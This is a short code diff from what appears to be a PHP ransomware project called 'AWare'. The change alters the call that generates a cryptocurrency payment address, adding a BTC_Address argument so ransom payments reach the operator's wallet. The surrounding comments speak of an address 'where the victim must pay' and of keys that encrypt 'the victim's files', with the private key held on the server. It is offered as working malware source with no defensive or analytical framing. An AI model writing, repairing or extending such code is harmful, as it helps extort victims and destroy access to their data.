@@ -43,7 +43,7 @@ class AWare
         }
 
         # Here create the address where the victim must pay
-        $AddressIn = $this->CryptAPIObject->GenerateAddress('https://' . Domain . '/AWare_API.php');
+        $AddressIn = $this->CryptAPIObject->GenerateAddress('https://' . Domain . '/AWareAPI.php', BTC_Address);
 
         # Public/private key with which the victim's files will be encrypted 
         # PS. The private key will be kept on the server
